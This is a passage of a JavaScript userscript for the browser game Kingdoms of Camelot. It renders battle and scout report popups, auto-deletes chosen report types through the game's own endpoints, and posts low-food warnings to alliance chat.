				onFailure: function (rslt) {
					
					},
			}, false);
	},
	//ripped off from anime tools
	ReportPopup: function (rslt, rpt, reportId) {
		var t = Rpt;
		var popReport = null;
		//need the info from the list query
		var m = '';
		var unitImg = [];
		for (var i=1;i<13;i++)
			unitImg[i] = '<img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_'+i+'_50_s34.jpg></TD><TD>' + uW.unitcost['unt'+i][0];
		unitImg[53] = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_53_30.png></TD><TD>'+culang.crossbows+'';
		unitImg[55] = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_55_30.png></TD><TD>'+culang.trebuchet+'';
		unitImg[60] = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_60_30.png></TD><TD>'+culang.trap+'';
		unitImg[61] = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_61_30.png></TD><TD>'+culang.caltr+'';
		unitImg[62] = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_62_30.png></TD><TD>'+culang.spiked+' ';
		goldImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/gold_30.png></TD><TD>'+culang.gold+'';
		foodImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png></TD><TD>'+culang.food+'';
		woodImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png></TD><TD>'+culang.wood+'';
		stoneImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png></TD><TD>'+culang.stone+'';
		oreImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png></TD><TD>'+culang.ore+'';
        aetherstoneImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/aetherstone_30.png></TD><TD>'+culang.astone+'';
		
		if (rpt.marchType == 0)
			rpt.marchName = culang.desert;
		else if (rpt.marchType == 1)
			rpt.marchName = culang.transport;
		else if (rpt.marchType == 2)
			rpt.marchName = culang.rptreinforce;
		else if (rpt.marchType == 3) {
			if (rpt.sideId == 0)
				rpt.marchName = culang.ascout;
			else
				rpt.marchName = culang.scout;
		} else if (rpt.marchType == 4) {
			if (rpt.sideId == 0)
				rpt.marchName = ''+culang.defense+'';
			else
				rpt.marchName = ''+culang.rptattack+'';
		} else
	rpt.marchName = '?';
		if (parseInt(rpt.side0TileType) == 10)
			rpt.side0TileTypeText=''+culang.rptgrass+'';
		else if (parseInt(rpt.side0TileType) == 11)
			rpt.side0TileTypeText=''+culang.rptlake+'';
		else if (parseInt(rpt.side0TileType) == 20)
			rpt.side0TileTypeText=''+culang.rptforest+'';
		else if (parseInt(rpt.side0TileType) == 30)
			rpt.side0TileTypeText=''+culang.rpthill+'';
		else if (parseInt(rpt.side0TileType) == 40)
			rpt.side0TileTypeText=''+culang.rptmount+'';
		else if (parseInt(rpt.side0TileType) == 50)
			rpt.side0TileTypeText=''+culang.rptplain+'';
		else if (parseInt(rpt.side0CityId) ==0)
			rpt.side0TileTypeText=''+culang.rptbarb+'';
		else
			rpt.side0TileTypeText=''+culang.city+'';

		
		function buildHeader () {
			var h='<TABLE class=pdxTab width=100%>';
			h+='<TR valign=top><TD align=left width=10%><B>';
			if (rpt.marchName == ''+culang.ascout+'' || rpt.marchName == ''+culang.scout+'')
				//h+=rpt.marchName+' '+culang.at+'';
					h+=" " + rpt.marchName+' '+culang.at+' ';
			else if (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')
				h+=''+culang.fightat+' ';
			else if (rpt.marchName == ''+culang.rptreinforce+'' || rpt.marchName == ''+culang.transport+'')
				h+=rpt.marchName+' '+culang.from+'<BR />'+rpt.marchName+' '+culang.to+'</B>';

			if (rpt.side0TileTypeText == ''+culang.rptbarb+'')
				h+=' '+culang.barbarians+' ' + rpt.side0TileLevel;
			else if (rpt.side0TileTypeText != ''+culang.city+'')
				h+=' '+rpt.side0TileTypeText+' '+culang.level+' '+ rpt.side0TileLevel+' ';
			h+='</B></TD>';

			if (rpt.marchName == ''+culang.rptreinforce+'' || rpt.marchName == ''+culang.transport+'') {
				h+='<TD align=left width=1%>';
				if (Seed.player.name != rpt.side1Name)
					h+=rpt.side1Name;
				if (Seed.player.name != rpt.side0Name)
					h+='<BR />'+rpt.side0Name;
				h+='</TD>';
			}
			h+='<TD align=left width=5%>';

			if (rpt.marchName == ''+culang.rptreinforce+'' || rpt.marchName == ''+culang.transport+'')
				h+='(<A onclick="pdxGotoMap('+ rpt.side1XCoord +','+ rpt.side1YCoord +')">'+ rpt.side1XCoord +','+ rpt.side1YCoord +'</a>)<BR />';
			h+='(<A onclick="pdxGotoMap('+ rpt.side0XCoord +','+ rpt.side0YCoord +')">'+ rpt.side0XCoord +','+ rpt.side0YCoord +'</a>)</TD>';
			if (rpt.side0TileTypeText != ''+culang.city+'' && rpt.side0TileTypeText != ''+culang.rptbarb+'' && (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')) {
				if (rslt['conquered']==1)
					h+='<TD><FONT color="#CC0000"><B>'+culang.conquered+'</B></font></td>';
				else if (rslt['conquered']==0)
					h+='<TD><FONT color="#66CC33"><B>'+culang.secured+'</B></font></td>';
			} else if (rpt.marchName == ''+culang.rptreinforce+'' || rpt.marchName == ''+culang.transport+'') {
				h+='<TD align=left width=5%>'+rpt.side1CityName+'<BR />';
				if (rpt.side0CityName != '')
					h+=rpt.side0CityName+'</TD>';
				else
					h+=rpt.side0TileTypeText+' '+culang.level+' '+ rpt.side0TileLevel+'</TD>';
			}

h+='<TD align=right>' + formatUnixTime(rpt.reportUnixTime,'24hour') + '<BR />&nbsp;<a onclick="DelReport('+ reportId +', false);document.getElementById(\'pdxRpt'+ reportId +'\').style.display=\'none\';document.getElementById(\'pbShowOther_X\').click();"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="'+culang.delrep+'"></a>&nbsp;<b>'+culang.shrreport+'</b>: ' + reportId + '</TD></TR></TABLE>';
			return h;
		}

		function handleunts () { // Troops sent to Reinforce or troops found on a Scout
			var hunts = '', th = '', tc = '', tf = '';
			if (rslt['unts'] != undefined) {
				if (rpt.marchName == ''+culang.rptreinforce+'')
					th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.troops+' '+culang.boosted+'</TH></TR>';
				else if (rslt['unts']['u1'] != undefined || rslt['unts']['u2'] != undefined || rslt['unts']['u3'] != undefined || rslt['unts']['u4'] != undefined || rslt['unts']['u5'] != undefined || rslt['unts']['u6'] != undefined || rslt['unts']['u7'] != undefined || rslt['unts']['u8'] != undefined || rslt['unts']['u9'] != undefined || rslt['unts']['u10'] != undefined || rslt['unts']['u11'] != undefined || rslt['unts']['u12'] != undefined)
					th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.troops+' '+culang.found+'!</TH></TR>';
				for (var i=1;i<13;i++)
					if (rslt['unts']['u'+i] != undefined)
						tc+='<TR><TD>' + unitImg[i] + '</TD><TD align=right>'+addCommas(rslt['unts']['u'+i])+'</TD></TR>';
				tf='</TABLE>';
			}
			if (tc != '')
				hunts = th + tc + tf;
			return hunts;
		}

		function handlersc () { // Resources brought with reinforcements or found on a Scout
			var hrsc = '', th = '', tc = '', tf = '';
			if (rslt['rsc'] != undefined) {
				if (rslt['rsc']['r1'] > 0 || rslt['rsc']['r2'] > 0 || rslt['rsc']['r3'] > 0 || rslt['rsc']['r4'] > 0) {
					if (rpt.marchName == ''+culang.rptreinforce+'')
						th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.goodies+'</TH></TR>';
					else {
						th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.shrres+'  '+culang.found+'</TH></TR>';
						if (rslt['gld'] > 0)//LangOptions
							tc+='<TR><TD>'+goldImg+'</TD><TD align=right>'+addCommasInt(rslt['gld'])+'</TD></TR>';
					}
					if (rslt['rsc']['r1'] > 0)
						tc+='<TR><TD>'+foodImg+'</TD><TD align=right>'+addCommasInt(rslt['rsc']['r1'])+'</TD></TR>';
					if (rslt['rsc']['r2'] > 0)
						tc+='<TR><TD>'+woodImg+'</TD><TD align=right>'+addCommasInt(rslt['rsc']['r2'])+'</TD></TR>';
					if (rslt['rsc']['r3'] > 0)
						tc+='<TR><TD>'+stoneImg+'</TD><TD align=right>'+addCommasInt(rslt['rsc']['r3'])+'</TD></TR>';
					if (rslt['rsc']['r4'] > 0)
						tc+='<TR><TD>'+oreImg+'</TD><TD align=right>'+addCommasInt(rslt['rsc']['r4'])+'</TD></TR>';
					tf='</TABLE>';
				}
			}
			if (tc != '')
				hrsc = th + tc + tf;
			return hrsc;
		}

		function handlefrt () { // Fortifications found on a Scout
			var hfrt = '', th = '', tc = '', tf = '';
			if (rslt['frt'] != 'undefined') {
				if (rslt['frt']['f53'] != undefined || rslt['frt']['f55'] != undefined || rslt['frt']['f60'] != undefined || rslt['frt']['f61'] != undefined || rslt['frt']['f62'] != undefined) {
					th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.founddef+'</TH></TR>';
					if (rslt['frt']['f53'] != undefined)
						tc+='<TR><TD>' + unitImg[53] + '</TD><TD align=right>'+addCommas(rslt['frt']['f53'])+'</TD></TR>';
					if (rslt['frt']['f55'] != undefined)
						tc+='<TR><TD>' + unitImg[55] + '</TD><TD align=right>'+addCommas(rslt['frt']['f55'])+'</TD></TR>';
					if (rslt['frt']['f60'] != undefined)
						tc+='<TR><TD>' + unitImg[60] + '</TD><TD align=right>'+addCommas(rslt['frt']['f60'])+'</TD></TR>';
					if (rslt['frt']['f61'] != undefined)
						tc+='<TR><TD>' + unitImg[61] + '</TD><TD align=right>'+addCommas(rslt['frt']['f61'])+'</TD></TR>';
					if (rslt['frt']['f62'] != undefined)
						tc+='<TR><TD>' + unitImg[62] + '</TD><TD align=right>'+addCommas(rslt['frt']['f62'])+'</TD></TR>';
					tf='</TABLE>';
				}
			}
			if (tc != '')
				hfrt = th + tc + tf;
			return hfrt;
		}

		function handleblds (bType) {
			var blds = rslt['blds']['b'+bType]; b = '<TR><TD>'; arField = [], firstbld = true;
			if (bType == 1)
				b+=''+culang.farm+' ';
			else if (bType == 2)
				b+=''+culang.sawmill+'';
			else if (bType == 3)
				b+=''+culang.quarry+'';
			else if (bType == 4)
				b+=''+culang.mine+'';
			b+='</TD><TD>';
			for (var i=1; i<12; i++)
				arField[i]=0;
			for (var i=0; i < blds.length; i++)
				arField[blds[i]]++
			for (var i=11; i>0; i--) {
				if (arField[i] > 0) {
					if (firstbld)
						firstbld = false;
					else
						b+=', ';
					if (arField[i] > 1)
						b+=arField[i] + ' x ';
					b+=' ' + i;
				}
			}
			b+='</TD></TR>';
			return b;
		}
	
		if (rpt.marchName == ''+culang.rptreinforce+'') {
			t.popReport = new CPopup('pbShowRein', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
			m+= '<DIV style="height:285px">';
		} else if (rpt.marchName == ''+culang.transport+'') {
			t.popReport = new CPopup('pbShowTrans', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
			m+= '<DIV style="height:185px">';
		} else if (rpt.marchName == ''+culang.scout+'' && rslt['winner']==1 && rpt.sideId==1){
			t.popReport = new CPopup('pbShowOther', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
			m+= '<DIV style="max-height:705px; height:705px; overflow-y:scroll">';
		} else {
			t.popReport = new CPopup('pbShowOther', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
			m+= '<DIV style="max-height:645px; height:645px; overflow-y:scroll">';
		}
		t.popReport.centerMe (mainPop.getMainDiv());

		m+=buildHeader();

		if (rpt.marchName == ''+culang.transport+'') { // Transport
			m+='<TABLE class=pdxTab>'; // Only transports have these in rslt, so handle them here
			if (parseInt(rslt['gold']) > 0)
				m+='<TR><TD>'+goldImg+'</TD><TD align=right>'+addCommas(rslt['gold'])+'</TD></TR>';
			if (parseInt(rslt['resource1']) > 0)
				m+='<TR><TD>'+foodImg+'</TD><TD align=right>'+addCommas(rslt['resource1'])+'</TD></TR>';
			if (parseInt(rslt['resource2']) > 0)
				m+='<TR><TD>'+woodImg+'</TD><TD align=right>'+addCommas(rslt['resource2'])+'</TD></TR>';
			if (parseInt(rslt['resource3']) > 0)
				m+='<TR><TD>'+stoneImg+'</TD><TD align=right>'+addCommas(rslt['resource3'])+'</TD></TR>';
			if (parseInt(rslt['resource4']) > 0)
				m+='<TR><TD>'+oreImg+'</TD><TD align=right>'+addCommas(rslt['resource4'])+'</TD></TR>';
			m+='</TABLE>';
		}

		m+='<TABLE class=pdxTab>';
		if ((rslt['winner']==1 && rpt.sideId==0) || (rslt['winner']==0 && rpt.sideId==1)) {
			if (rpt.marchName == ''+culang.scout+'')
				m+='<TR><TD><FONT color="#CC0000"><B>'+culang.rptscoutmiss+'</B></font></TD></TR>';
			else
				m+='<TR><TD><FONT color="#CC0000"><B>'+culang.rptulose+'</B></font></TD></TR>';
		}
		if (rslt['winner']==0 && rpt.sideId==0)
			m+='<TR><TD><FONT color="#66CC33"><B>'+culang.rptudefend+'</B></font></TD></TR>';
		if (rslt['winner']==1 && rpt.sideId==1) {
			if (rpt.marchName == ''+culang.scout+'')
				m+='<TR><TD><FONT color="#66CC33"><B>'+culang.scout+' '+culang.shrreport+'</B></font></TD></TR>';
			else
				m+='<TR><TD><FONT color="#66CC33"><B>'+culang.rptuwin+'</B></font></TD></TR>';
		}

		if (rslt['wall'] != undefined) {
			if (rslt['wall'] == 100)
				m+='<TR><TD>'+culang.rptattacker+'</TD></TR>';
			else
				m+='<TR><TD>'+culang.rptwalldont+' '+rslt['wall']+'% </TD></TR>';
		}
		m+= '</TABLE><BR />';

		if (rslt['loot'] != undefined) {
			m+='<TABLE class=pdxTab>';
			if (rslt['loot'][0] > 0)
				m+='<TR><TD>'+goldImg+'</TD><TD align=right>'+addCommas(rslt['loot'][0])+'</TD></TR>';
			if (rslt['loot'][1] > 0)
				m+='<TR><TD>'+foodImg+'</TD><TD align=right>'+addCommas(rslt['loot'][1])+'</TD></TR>';
			if (rslt['loot'][2] > 0)
				m+='<TR><TD>'+woodImg+'</TD><TD align=right>'+addCommas(rslt['loot'][2])+'</TD></TR>';
			if (rslt['loot'][3] > 0)
				m+='<TR><TD>'+stoneImg+'</TD><TD align=right>'+addCommas(rslt['loot'][3])+'</TD></TR>';
			if (rslt['loot'][4] > 0)
				m+='<TR><TD>'+oreImg+'</TD><TD align=right>'+addCommas(rslt['loot'][4])+'</TD></TR>';
			if (rslt['loot'][5] !== undefined) {
				var q=unsafeWindow.Object.keys(rslt['loot'][5]);
				if (q.length>0) {
				 for(var u=0,y=q.length;u<y;++u){
				 C=q[u];
				 if (unsafeWindow.ksoItems[C]!==undefined) 
				  m+="<TR><td><img width=30 src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/" + C + ".jpg></td><td colspan=2>"+unsafeWindow.ksoItems[C].name+"</td></tr>";
			        }
			        }
				
			}
			m+='</TABLE><BR />';
		}

		if (rpt.marchName == ''+culang.rptreinforce+'') {
			m+=handleunts();
			m+=handlersc();
		}

		if (rpt.marchName == ''+culang.scout+'' && rslt['winner']==1) {
			m+='<TABLE class=pdxTab width=100%><TR><TD width=50% align=left valign=top>';
			m+=handleunts();
			if (rpt.side0TileTypeText!=''+culang.darkforest+'')  m+=handlefrt();
			m+=handlersc();
			m+='</TD><TD width=50% align=left valign=top>';
			if (rpt.side0TileTypeText!=''+culang.darkforest+'') {
			m+='<TABLE class=pdxTab width=100%>';
			if (rslt['lstlgn'] != undefined) {
				if (!rslt['lstlgn'])
					m+='<TR><TD>'+culang.lastlogin+': '+culang.nodatarec+'</TD></TR>';
				else
					m+='<TR><TD>'+culang.lastlogin+': ' + formatUnixTime(rslt['lstlgn']) + '</TD></TR>';
			}
			m+='<TR><TD>'+culang.marschall+': ';
			if (rslt['knt'] != undefined)
				m+=rslt['knt']['cbt'];
			else
				m+=''+culang.none+'';
			m+='</TD></TR>';
			if (rslt['pop'] != undefined)
				m+='<TR><TD>'+culang.pop+': ' + addCommas(rslt['pop']) + '</TD></TR>';
			if (rslt['hap'] != undefined)
				m+='<TR><TD>'+culang.luck+': ' + addCommas(rslt['hap']) + '</TD></TR></TABLE>';
			if (rslt['blds']['b1'] != undefined || rslt['blds']['b2'] != undefined || rslt['blds']['b3'] != undefined || rslt['blds']['b4'] != undefined) {
				m+='<TABLE class=pdxTab><TR><TH colspan=2 align=left>'+culang.fields+'</TH></TR>';
				for (var i=1; i<5; i++)
					if (rslt['blds']['b'+i] != undefined)
						m+=handleblds(i);
				m+='</TABLE>';
			}
			if (rslt['tch'] != undefined) {
				m+='<TABLE class=pdxTab><TR><TH colspan=2 align=left>'+culang.research+'</TH></TR>';
				for (var tl=1; tl < 17; tl++)
					if (tl != 7)
						m+='</TD></TR><TR><TD>'+researchLevels[tl].Name+'</TD><TD align=right>' + rslt['tch']['t'+tl] + '</TD></TR>';
				m+='</TABLE>';
			}
			}
			m+='</TD></TR></TABLE>';
		}

		if (rslt['fght'] != undefined){ // not Reinforce or Transport, so we have a table with 2 columns: 1 for Attackers, 1 for Defenders
			m+='<TABLE class=pdxTab width=100%><TR><TD width=50% align=left valign=top>';
			m+='<TABLE class=pdxTab width=100%>';
			m+='<TR><TD colspan=4><B>'+culang.victim+'</B> ('+rpt.side1Name+')';
			if (rslt['winner']==1)
				m+='<FONT color="#CC0000"><B> '+culang.winner+'</B></FONT>';
			m+='</TD></TR>';
			if (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')
				m+='<TR><TD colspan=4>'+culang.knights+': ' + rslt['s1KCombatLv'] + '</TD></TR>';
			m+='<TR><TD colspan=4>'+culang.rptattack+' ('+culang.boosted+'): ' + 100*rslt['s1atkBoost'] + '%</TD></TR>';
			m+='<TR><TD colspan=4>'+culang.def+' ('+culang.boosted+'): ' + 100*rslt['s1defBoost'] + '%</TD></TR>';
			m+='<TR><TD colspan=4>(<A onclick="pdxGotoMap('+ rpt.side1XCoord +','+ rpt.side1YCoord +')">'+ rpt.side1XCoord +','+ rpt.side1YCoord +'</a>) ' + rpt.side1CityName + '</TD></TR>';
			if (rslt['fght']["s1"] != undefined) {
			m+='<TR><TH></TH><TH align=left>'+culang.troops+'</TH><TH align=right>'+culang.fighted+'</TH><TH align=right>'+culang.comeback+'</TH><TH align=right>'+culang.rptKilled+'</TH></TR>';
				for (var i=1;i<13;i++) {
					if (rslt['fght']["s1"]['u'+i] != undefined) {
						if (rslt['fght']["s1"]['u'+i][0] > rslt['fght']["s1"]['u'+i][1]) {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s1"]['u'+i][0])+'</td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s1"]['u'+i][1])+'</FONT></td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s1"]['u'+i][0] - rslt['fght']["s1"]['u'+i][1])+'</FONT></td></tr>';
						} else {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s1"]['u'+i][0])+'</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s1"]['u'+i][1])+'</td></tr>';
						}
					}
				}
			}
			m+='</TABLE></TD><TD width=50% align=right valign=top>';
			m+='<TABLE class=pdxTab width=100%>';
			m+='<TR><TD colspan=4><B>'+culang.def+'</B> ('+rpt.side0Name+')';
			if (rslt['winner']==0)
				m+='<FONT color="#CC0000"><B> '+culang.winner+'</B></FONT>';
			m+='</TD></TR>';
			if (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')
				m+='<TR><TD colspan=4>'+culang.knights+': ' + rslt['s0KCombatLv'] + '</TD></TR>';
			if (rslt['s0atkBoost'] != undefined)
				m+='<TR><TD colspan=4>'+culang.rptattack+' ('+culang.boosted+'): ' + 100*rslt['s0atkBoost'] + '%</TD></TR>';
			else
				m+='<TR><TD colspan=4>&nbsp;</TD></TR>';
			if (rslt['s0defBoost'] != undefined)
				m+='<TR><TD colspan=4>'+culang.def+' ('+culang.boosted+'): ' + 100*rslt['s0defBoost'] + '%</TD></TR>';
			else
				m+='<TR><TD colspan=4>&nbsp;</TD></TR>';
			m+='<TR><TD colspan=4>'+culang.rounds+': ' + rslt['rnds'] + '</TD></TR>';
			if (rslt['fght']["s0"] != undefined) {
				m+='<TR><TH></TH><TH align=left>'+culang.troops+'</TH><TH align=right>'+culang.fighted+'</TH><TH align=right>'+culang.comeback+'</TH></TR>';
				for (var i=1;i<13;i++) {
					if (rslt['fght']["s0"]['u'+i] != undefined) {
						if (rslt['fght']["s0"]['u'+i][0] > rslt['fght']["s0"]['u'+i][1]) {
							perte_def= perte_def +(rslt['fght']["s0"]['u'+i][0] - rslt['fght']["s0"]['u'+i][1])*puipui[i-1];
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['u'+i][0])+'</td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s0"]['u'+i][1])+'</FONT></td></tr>';
						} else {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['u'+i][0])+'</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['u'+i][1])+'</td></tr>';
						}
					}
				}
				for (var i=53;i<=55;i++) {
					if (rslt['fght']["s0"]['f'+i] != undefined) {
						if (rslt['fght']["s0"]['f'+i][0] > rslt['fght']["s0"]['f'+i][1]) {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][0])+'</td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s0"]['f'+i][1])+'</font></td></tr>';
						} else {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][0])+'</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][1])+'</td></tr>';
						}
					}
				}
				for (var i=60;i<=63;i++) {
					if (rslt['fght']["s0"]['f'+i] != undefined) {
						if (rslt['fght']["s0"]['f'+i][0] > rslt['fght']["s0"]['f'+i][1]) {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][0])+'</td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s0"]['f'+i][1])+'</font></td></tr>';
						} else {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][0])+'</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][1])+'</td></tr>';
						}
					}
				}
			} else
				m+='<TR><TD><b><span class=boldGreen>'+culang.notrpdef+'</span></TD></TR>';
			m+='</TABLE></TD></TR></TABLE>';
		}

		m+='</DIV>';
		t.popReport.getMainDiv().innerHTML = m;
		t.popReport.getTopDiv().innerHTML = '<DIV align=center style="color:#FFFFFF;"><B>'+rpt.marchName+' '+culang.report+'</B></DIV>';
		t.popReport.show(true);
		},
		};

function displayReport (rptid, side){
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  params.rid = rptid;
  params.side = side;

  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/fetchReport.php" + unsafeWindow.g_ajaxsuffix, {
    method: "post",
    parameters: params,
    onSuccess: function (rslt) {
logit (inspect (rslt, 5, 1));
      if (notify)
        notify (rslt.errorMsg);
    },
    onFailure: function () {
      if (notify)
        notify ('AJAX '+culang.Herror+'');
    },
  });
}

/**********************************************************************************/
/************ KOC POWER - DELETE REPORTS *****************************************/
/********************************************************************************/
var DeleteReports = {
	deleting : false,
	timer:null,
	init : function(){
		var t = DeleteReports;
		//setInterval(t.startdeletereports, 2*60*1000);
		clearInterval(t.timer);
		if(!t.deleting && (Options.DeleteMsg || Options.DeleteMsgs0 || Options.DeleteMsgs1 || Options.DeleteMsgs2 || Options.DeleteMsgs3)){
		t.timer = setInterval(t.startdeletereports, Options.DeleteTimer*1000); 
 } 
	},
	
    startdeletereports : function(){
		var t = DeleteReports;
	  	if(!t.deleting && (Options.DeleteMsg || Options.DeleteMsgs0 || Options.DeleteMsgs1 || Options.DeleteMsgs2 || Options.DeleteMsgs3)){
	  		t.deleting = true;
	  		t.fetchreport(0, t.checkreports);
	  	}
    },

    fetchreport : function(pageNo, callback){
		var t = DeleteReports;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		if(pageNo > 1)
			params.pageNo = pageNo;
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/listReports.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function (rslt) {
				callback(rslt);
			},
				onFailure: function () {
				callback();
			},
		});
    },
    checkreports : function(rslt){
		var t = DeleteReports;
		if(!rslt.ok){
			return;
		}
		if(rslt.arReports.length < 1){
			return;
		}
		var reports = rslt.arReports;
		var totalPages = rslt.totalPages;
		var deletes1 = new Array();
		var deletes0 = new Array();
		for(k in reports){
		if(Options.DeleteMsg){
		if((reports[k].marchType==9 || reports[k].marchType==4) && reports[k].side0PlayerId==0 && reports[k].side0TileType > 50)
					deletes1.push(k.substr(2));
				else if(reports[k].marchType==1 && t.isMyself(reports[k].side1PlayerId))
					deletes1.push(k.substr(2));
		}
			if (Options.DeleteMsgs0){
				if(reports[k].marchType==1 && !t.isMyself(reports[k].side1PlayerId))
					deletes0.push(k.substr(2));
			}
			if (Options.DeleteMsgs1){
			if(reports[k].marchType==4 && (reports[k].side0TileType <= 50)&& reports[k].side0PlayerId==0)
				deletes1.push(k.substr(2));
			}
			if (Options.DeleteMsgs2){
			if(reports[k].side0TileType==54) 			
				deletes1.push(k.substr(2));
			}
			if (Options.DeleteMsgs3){
			if(reports[k].side0TileType==51 && reports[k].marchType==2 && t.isMyself(reports[k].side0PlayerId))
			deletes1.push(k.substr(2));
			} 
		}
		if(deletes1.length > 0 || deletes0.length > 0){
			t.deleteCheckedReports(deletes1, deletes0);
		} else {
			t.deleting = false;
			return;
		}
    },
    
	deleteCheckedReports : function(deletes1, deletes0){
		var t = DeleteReports;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.s1rids = deletes1.join(",");
		params.s0rids = deletes0.join(",");
		params.cityrids = '';
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/deleteCheckedReports.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function (rslt) {
				if(rslt.ok){
					Seed.newReportCount = parseInt(Seed.newReportCount) - parseInt(deletes1.length) - parseInt(deletes0.length);
					actionLog('<b>'+culang.reportman+'</b>: <span class=boldRed>' +parseInt(deletes1.length + deletes0.length)+'</span> '+culang.actionRpt+'');
				}
				t.fetchreport(0, t.checkreports);
			},
			onFailure: function () {
			},
		});
    },
	
    isMyself: function(userID){
		var t = DeleteReports;
		if(!Seed.players["u"+userID])
			return false;
		if(Seed.players["u"+userID].n == Seed.player.name)
			return true;
		else
			return false;
		return false;
    },
}
/**********************************************************************************/
/************ KOC POWER - FOOD ALERT *********************************************/
/********************************************************************************/
var FoodAlerts = {

  init : function (){
   var f = FoodAlerts;
   f.e_eachMinute();
  },

  minuteTimer : null,

  e_eachMinute : function (){
    var f = FoodAlerts;
    var now = unixTime();
      row = [];

      for(i=0; i < Cities.numCities; i++) {
        var rp = getResourceProduction (Cities.cities[i].id);
        var foodleft = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][0])/3600;
        var usage = rp[1] - parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][3]);
    var totalusage = (rp[1] - usage);
        row[i] = rp[1] - usage;
          var timeLeft = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][0]) / 3600 / (0-usage) * 3600;
          var msg = '';
    if (timeLeft > 0 && (timeLeft<(Options.foodChatWarnHours*3600))) {
                msg += ''+culang.lowfood1+' ' + Cities.cities[i].name.substring(0,10) + ' (' +
                       Cities.cities[i].x +','+ Cities.cities[i].y + ') '+culang.lowfood2+'';
                msg += ' '+culang.lowfoodsend+' '+addCommasWhole(foodleft)+' ('+timestrShort(timeLeft)+') - '+culang.usage+': '+addCommas(usage);
                if (Options.enableFoodChatWarn==true) sendChat ("/a " + msg);
          }
      }
  f.minuteTimer = setTimeout (f.e_eachMinute, 600000);
  },
}
/***********************************************************************************/
/************ KOC POWER - TABS START **********************************************/
/*********************************************************************************/


/***********************************************************************************/
/************ KOC POWER - TABS OVERVIEW *******************************************/
/*********************************************************************************/
function getResourceProduction (cityId){
  var ret = [0,0,0,0,0];
  var now = unixTime ();
  var search='type==10 || type==11';
  var wilds = [0, 0, 0, 0, 0];
  var w = Seed.wilderness["city" + cityId];
  for (var k in w){
    var type = parseInt(w[k].tileType);

    if (type==10 || type==11)
	      wilds[1] += parseInt(w[k].tileLevel);
	    else 
	      wilds[type/10] += parseInt(w[k].tileLevel);
  }  
  knight = 0;       
  var s = Seed.knights["city" + cityId];
  if (s) {
    s = s["knt" + Seed.leaders["city" + cityId].resourcefulnessKnightId];
    if (s){
      var knight = parseInt(s.resourcefulness);
      if (s.resourcefulnessBoostExpireUnixtime > now)
        knight *= 1.25;
    }
  }
  var workerFactor = 1;
  var c = parseInt(Seed.citystats["city" + cityId]["pop"][0]);  // Current  population
